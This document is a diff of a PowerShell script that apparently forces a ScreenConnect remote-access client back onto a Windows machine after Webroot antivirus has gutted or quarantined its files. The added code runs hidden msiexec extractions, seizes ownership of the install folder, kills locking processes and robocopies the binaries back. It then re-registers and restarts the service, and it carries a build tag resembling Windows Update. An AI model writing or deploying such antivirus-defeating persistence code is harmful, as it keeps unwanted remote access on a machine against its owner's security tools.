@@ -446,17 +446,15 @@ function Get-ScBinaryHealth {
         ("$($_.Name) $($_.ExecutablePath) $($_.CommandLine)" -like "*$PrimaryFingerprint*") -and
         ($_.Name -match '(?i)ScreenConnect|ClientService')
     }).Count
-    # Webroot guts *.exe to tiny stubs / drops WindowsClient while leaving large DLLs.
-    if ($info.MaxExeSize -gt 0 -and $info.MaxExeSize -lt 250000) {
-        $info.Stubbed = $true
-    }
-    if ($info.SvcExeSize -gt 0 -and $info.SvcExeSize -lt 250000) {
-        $info.Stubbed = $true
-    }
+    # Real sevrz MSI ships ClientService.exe ~95KB — that is NOT a Webroot stub.
+    # Stub/gut signals: missing WindowsClient, truncated client, or absurdly tiny service exe.
     if ($info.Roots.Count -gt 0 -and -not $info.HasClientExe) {
         $info.Stubbed = $true
     }
-    if ($info.HasClientExe -and $info.ClientExeSize -lt 250000) {
+    if ($info.HasClientExe -and $info.ClientExeSize -lt 200000) {
+        $info.Stubbed = $true
+    }
+    if ($info.SvcExeSize -gt 0 -and $info.SvcExeSize -lt 40000) {
         $info.Stubbed = $true
     }
     return $info
@@ -534,7 +532,7 @@ function Get-PrimaryScInstallDir {
 }
 
 function Expand-ScMsiOverInstall {
-    # msiexec /i often exit=0 without overwriting Webroot stubs — admin-extract + force copy
+    # msiexec /i often exit=0 without writing files — admin-extract then robocopy the real payload folder
     param([string]$MsiPath, [string]$DestDir)
     if (-not (Test-Path $MsiPath)) { return $false }
     $extract = Join-Path $WorkDir 'msi_extract'
@@ -544,36 +542,49 @@ function Expand-ScMsiOverInstall {
     $ep = Start-Process msiexec.exe -ArgumentList "/a `"$MsiPath`" /qn TARGETDIR=`"$extract`"" `
         -Wait -PassThru -WindowStyle Hidden
     Write-Log "REPAIR: msiexec /a exit $($ep.ExitCode)"
-    $bins = @(Get-ChildItem -Path $extract -Recurse -Include 'ScreenConnect*.exe', 'ScreenConnect*.dll' -ErrorAction SilentlyContinue)
-    if ($bins.Count -lt 1) {
-        Write-Log 'REPAIR: MSI extract produced no ScreenConnect binaries'
+    $svcBin = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+        Sort-Object Length -Descending | Select-Object -First 1
+    if (-not $svcBin) {
+        Write-Log 'REPAIR: MSI extract has no ClientService.exe'
+        Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
         return $false
     }
+    $srcRoot = $svcBin.Directory.FullName
+    Write-Log "REPAIR: payload folder $srcRoot (svc=$($svcBin.Length))"
     New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
     cmd /c "takeown /F `"$DestDir`" /R /D Y" >$null 2>&1
     cmd /c "icacls `"$DestDir`" /grant Administrators:F /T /C" >$null 2>&1
-    $copied = 0
-    foreach ($b in $bins) {
-        $rel = $b.FullName.Substring($extract.Length).TrimStart('\')
-        $target = Join-Path $DestDir $rel
-        $parent = Split-Path $target -Parent
-        if (-not (Test-Path $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
-        try {
-            if (Test-Path $target) {
-                cmd /c "takeown /F `"$target`" /D Y" >$null 2>&1
-                attrib -r -s -h "$target" >$null 2>&1
-                Remove-Item $target -Force -ErrorAction SilentlyContinue
-            }
-            Copy-Item -LiteralPath $b.FullName -Destination $target -Force -ErrorAction Stop
-            Write-Log ("REPAIR: restored {0} bytes={1}" -f $b.Name, $b.Length)
-            $copied++
-        } catch {
-            Write-Log ("REPAIR: copy failed {0}: {1}" -f $b.Name, $_.Exception.Message)
+    # Stop anything locking DestDir before overwrite
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        ("$($_.ExecutablePath)" -like "*$PrimaryFingerprint*")
+    } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+    & sc.exe stop "$SvcName" >$null 2>&1
+    Start-Sleep -Seconds 2
+    $rcLog = Join-Path $WorkDir 'robocopy_sc.log'
+    & robocopy.exe "$srcRoot" "$DestDir" /E /IS /IT /R:2 /W:1 /NFL /NDL /NJH /NJS /nc /ns /np `
+        /LOG:"$rcLog" >$null 2>&1
+    $rc = $LASTEXITCODE
+    Write-Log "REPAIR: robocopy exit $rc (0-7=ok)"
+    $copied = @(Get-ChildItem -Path $DestDir -Filter 'ScreenConnect*.exe' -ErrorAction SilentlyContinue)
+    foreach ($c in $copied) {
+        Write-Log ("REPAIR: restored {0} bytes={1}" -f $c.Name, $c.Length)
+    }
+    $client = Get-Item (Join-Path $DestDir 'ScreenConnect.WindowsClient.exe') -ErrorAction SilentlyContinue
+    if (-not $client) {
+        $client = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.WindowsClient.exe' -ErrorAction SilentlyContinue |
+            Select-Object -First 1
+        if ($client) {
+            Copy-Item $client.FullName -Destination (Join-Path $DestDir $client.Name) -Force
+            Write-Log ("REPAIR: forced WindowsClient bytes={0}" -f $client.Length)
         }
     }
     Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Log "REPAIR: extract/copy restored $copied files"
-    return ($copied -gt 0)
+    $ok = (Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe')) -and (
+        (Test-Path (Join-Path $DestDir 'ScreenConnect.WindowsClient.exe')) -or
+        (Test-Path (Join-Path $DestDir 'ScreenConnect.Client.exe'))
+    )
+    Write-Log ("REPAIR: extract/robocopy ok=$ok files=$($copied.Count)")
+    return $ok
 }
 
 function Repair-ScAfterAv {
@@ -601,24 +612,35 @@ function Repair-ScAfterAv {
         return $false
     }
     $logMsi = Join-Path $WorkDir 'msi_repair.log'
-    # Always force file overwrite (amus). Plain /i exit=0 often leaves stubs untouched.
-    Write-Log 'REPAIR: msiexec /i REINSTALL=ALL REINSTALLMODE=amus'
-    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus /l*v `"$logMsi`"" `
+    # Residue wiped — prefer fresh /i (amus on missing product is a no-op)
+    Write-Log 'REPAIR: msiexec /i fresh install'
+    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
         -Wait -PassThru -WindowStyle Hidden
     Write-Log "REPAIR: msiexec exit $($p.ExitCode)"
     if ($p.ExitCode -ne 0) {
-        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+        Write-Log 'REPAIR: msiexec /i REINSTALL=ALL REINSTALLMODE=amus'
+        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus /l*v `"$logMsi`"" `
             -Wait -PassThru -WindowStyle Hidden
-        Write-Log "REPAIR: msiexec fresh-install exit $($p2.ExitCode)"
+        Write-Log "REPAIR: msiexec amus exit $($p2.ExitCode)"
     }
     Start-Sleep -Seconds 8
 
     $dest = Get-PrimaryScInstallDir
+    New-Item -ItemType Directory -Path $dest -Force | Out-Null
     $hMid = Get-ScBinaryHealth
-    if ($hMid.Stubbed -or -not $hMid.HasClientExe) {
-        Write-Log 'REPAIR: stubs remain after msiexec - admin-extract + force copy'
+    # Always layer extract/robocopy — guarantees WindowsClient lands in the service folder
+    Write-Log 'REPAIR: admin-extract + robocopy into install dir'
+    Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir $dest | Out-Null
+    Start-Sleep -Seconds 2
+
+    if (-not (Test-ScServicePresent)) {
+        Write-Log 'REPAIR: service missing after files - msiexec /i to register'
+        $p3 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+            -Wait -PassThru -WindowStyle Hidden
+        Write-Log "REPAIR: msiexec register exit $($p3.ExitCode)"
+        Start-Sleep -Seconds 5
+        # Re-apply binaries in case msiexec left stubs / skipped files again
         Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir $dest | Out-Null
-        Start-Sleep -Seconds 2
     }
 
     Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
@@ -630,7 +652,11 @@ function Repair-ScAfterAv {
     Write-Log ("SC health after repair: running={0} exes={1} procs={2} stub={3} svcExe={4} client={5}/{6}" -f `
         $h2.ServiceRunning, $h2.ExeCount, $h2.ProcCount, $h2.Stubbed, $h2.SvcExeSize, $h2.HasClientExe, $h2.ClientExeSize)
     foreach ($d in $h2.ExeDetail) { Write-Log ("  bin: $d") }
-    $ok = ((Test-ScServiceRunning) -and -not $h2.Stubbed -and $h2.HasClientExe -and -not (Test-ScControlBroken))
+    $ok = ((Test-ScServicePresent) -and -not $h2.Stubbed -and $h2.HasClientExe)
+    if ($ok -and -not (Test-ScServiceRunning)) {
+        Start-PrimaryService | Out-Null
+        $ok = [bool](Test-ScServiceRunning)
+    }
     if ($ok) {
         $marker = Join-Path $WorkDir '.repaired_webroot'
         Set-Content -Path $marker -Value (Get-Date -Format 'o') -Encoding ASCII -Force
@@ -1308,7 +1334,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730E'
+Write-Log 'WU_BUILD_20260730F'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
